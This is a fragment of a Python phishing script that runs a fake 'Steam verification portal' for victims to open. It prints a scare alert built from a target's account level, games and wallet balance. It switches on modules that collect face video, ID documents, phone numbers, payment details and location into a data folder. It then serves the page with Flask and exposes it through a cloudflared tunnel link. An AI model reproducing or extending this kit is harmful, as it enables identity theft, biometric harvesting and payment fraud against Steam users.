    print(f"[+] Wallet Balance: {VERIFICATION_SETTINGS['steam_wallet']}")
    print(f"[+] Profile: {VERIFICATION_SETTINGS['steam_profile']}")
    print(f"[+] Verification Type: {VERIFICATION_SETTINGS['title']}")
    print(f"[+] Reason: {VERIFICATION_SETTINGS['reason']}")
    
    print(f"\n[+] Data folder: {DOWNLOAD_FOLDER}")
    
    if VERIFICATION_SETTINGS['face_enabled']:
        print(f"[+] Face verification: Enabled ({VERIFICATION_SETTINGS.get('face_duration', 15)}s)")
    if VERIFICATION_SETTINGS['id_enabled']:
        print(f"[+] ID verification: Enabled")
    if VERIFICATION_SETTINGS['phone_enabled']:
        print(f"[+] Phone verification: Enabled")
    if VERIFICATION_SETTINGS['payment_enabled']:
        print(f"[+] Payment verification: Enabled ({VERIFICATION_SETTINGS.get('purchase_amount', '$59.99')})")
    if VERIFICATION_SETTINGS['location_enabled']:
        print(f"[+] Location verification: Enabled")
    
    print("\n[+] Starting Steam verification portal...")
    print("[+] Press Ctrl+C to stop.\n")
    
    print("="*60)
    print("STEAM VERIFICATION REQUIRED")
    print("="*60)
    print(f"🎮 Account: {VERIFICATION_SETTINGS['steam_username']}")
    print(f"⭐ Level: {VERIFICATION_SETTINGS['steam_level']}")
    print(f"🎮 Games: {VERIFICATION_SETTINGS['steam_games']}")
    print(f"💰 Wallet: {VERIFICATION_SETTINGS['steam_wallet']}")
    print(f"⚠️  ALERT: {VERIFICATION_SETTINGS['title']}")
    print(f"📋 REASON: {VERIFICATION_SETTINGS['reason']}")
    if VERIFICATION_SETTINGS['verification_type'] == 'steam_guard':
        print(f"🔐 SECURITY: Enable Steam Guard two-factor authentication")
    elif VERIFICATION_SETTINGS['verification_type'] == 'purchase_verification':
        print(f"💳 AMOUNT: {VERIFICATION_SETTINGS.get('purchase_amount', '$59.99')}")
    print("="*60)
    print("Open the link below to start Steam verification...\n")
    
    flask_thread = Thread(target=lambda: app.run(host='127.0.0.1', port=port))
    flask_thread.daemon = True
    flask_thread.start()
    time.sleep(1)
    
    try:
        run_cloudflared_and_print_link(port, script_name)
    except KeyboardInterrupt:
        print("\n[+] Shutting down Steam verification portal...")
        sys.exit(0)